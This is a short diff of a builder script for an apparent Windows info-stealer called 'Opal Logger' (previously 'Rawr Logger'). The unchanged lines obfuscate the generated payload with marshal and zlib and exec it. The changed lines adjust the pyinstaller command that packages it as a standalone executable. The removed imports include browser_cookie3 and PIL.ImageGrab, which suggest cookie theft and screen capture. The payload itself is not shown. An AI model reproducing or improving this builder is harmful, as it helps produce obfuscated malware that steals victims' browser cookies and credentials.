@@ -36,11 +36,11 @@ with open(f'{name}.py') as fi:
         f.write(f"import marshal,zlib;exec(marshal.loads(zlib.decompress({zlb})))")
     compile = Write.Input("Would You Like To Complie To A Exe y/n:", Colors.green_to_blue, interval=0.01)
     if compile == "y":
-        os.system(f'pyinstaller --onefile --hidden-import="requests" --hidden-import="PIL" --hidden-import="os" --hidden-import="pystyle"  --hidden-import="socket" --hidden-import="threading" --hidden-import="PIL.ImageGrab" --hidden-import="browser_cookie3"  --hidden-import="json"  --hidden-import="platform"  --hidden-import="re"  --hidden-import="uuid" --hidden-import="psutil" --hidden-import="psutil"  --hidden-import="win32api" {name}.py')
+        os.system(f'pyinstaller --onefile  {name}.py')
         os.remove(f'{name}.spec')
         Write.Print("Opal Logger Was SucessFully Complied In Dist Folder\n",Colors.green_to_blue, interval=0.01) 
         time.sleep(2)
-        Write.Print("This Program Will Now Exit In 3 Secs Thank You For Using Rawr Logger\n",Colors.green_to_blue, interval=0.01) 
+        Write.Print("This Program Will Now Exit In 3 Secs Thank You For Using Opal Logger\n",Colors.green_to_blue, interval=0.01) 
         time.sleep(3)
         exit()
     elif compile == "n":
